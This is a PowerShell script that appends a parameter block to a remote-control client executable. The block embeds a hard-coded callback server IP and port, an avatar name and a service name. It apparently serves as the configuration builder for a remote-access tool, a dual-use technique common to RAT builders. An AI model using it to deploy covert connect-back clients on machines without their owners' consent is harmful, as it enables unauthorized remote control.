$clientExe = "C:\RemoteControl-1\RemoteControl.Client\bin\Debug\RemoteControl.Client.exe"
$exeData = [System.IO.File]::ReadAllBytes($clientExe)

# Build the ClientParameters struct (64 bytes total)
$paraBytes = New-Object byte[] 64

# Header: 0xff x 4
$paraBytes[0] = 0xff; $paraBytes[1] = 0xff; $paraBytes[2] = 0xff; $paraBytes[3] = 0xff

# ServerIP: 203.91.76.159 as IPv4 bytes -> uint32 -> int64 (little-endian)
$ipBytes = [System.Net.IPAddress]::Parse("203.91.76.159").GetAddressBytes()
$ipUint = [BitConverter]::ToUInt32($ipBytes, 0)
$ipLong = [BitConverter]::GetBytes([long]$ipUint)
[Array]::Copy($ipLong, 0, $paraBytes, 4, 8)

# ServerPort: 10010
$portBytes = [BitConverter]::GetBytes([int]10010)
[Array]::Copy($portBytes, 0, $paraBytes, 12, 4)

# OnlineAvatar: "16238_100.png" (24 bytes, null-padded)
$avatar = [System.Text.Encoding]::Default.GetBytes("16238_100.png")
[Array]::Copy($avatar, 0, $paraBytes, 16, $avatar.Length)

# ServiceName: "RemoteControlClient.exe" (24 bytes, null-padded)
$svcName = [System.Text.Encoding]::Default.GetBytes("RemoteControlClient.exe")
[Array]::Copy($svcName, 0, $paraBytes, 40, $svcName.Length)

# Write: original data + params appended
$fs = [System.IO.File]::Open($clientExe, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
$fs.Write($exeData, 0, $exeData.Length)
$fs.Write($paraBytes, 0, $paraBytes.Length)
$fs.Close()
Write-Host "Parameters written successfully. Exe size: $((Get-Item $clientExe).Length) bytes"
